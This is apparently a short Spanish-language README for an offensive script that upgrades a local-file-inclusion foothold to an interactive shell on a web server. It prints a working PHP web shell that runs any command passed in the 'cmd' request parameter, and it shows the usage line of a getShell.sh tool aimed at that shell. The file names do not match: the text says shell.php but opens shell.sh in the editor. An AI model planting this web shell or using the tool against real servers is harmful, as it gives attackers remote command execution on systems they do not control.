# TTY BASH LINUX
## Script para obtener una tty funcional apartir de un LFI.

### Primeramente, debemos de tener un servidor corriendo de manera local
### Y tener un archivo llamando **shell.php**

```bash
markos: /var/www/html~$ vim shell.sh
```

```php
<?php
    echo '<prev>' . shell_exec($_REQUEST['cmd']) . '</prev>';
?>
```

```bash
./getShell.sh 
[*]Uso: ./getShell 

	u)Direccion URL

[*]Ejemplo: ./getShell -u http://127.0.0.1:8080/shell.php
```

### Haciendo esto, tenemos una TYY funcional para movernos como una consola interactiva
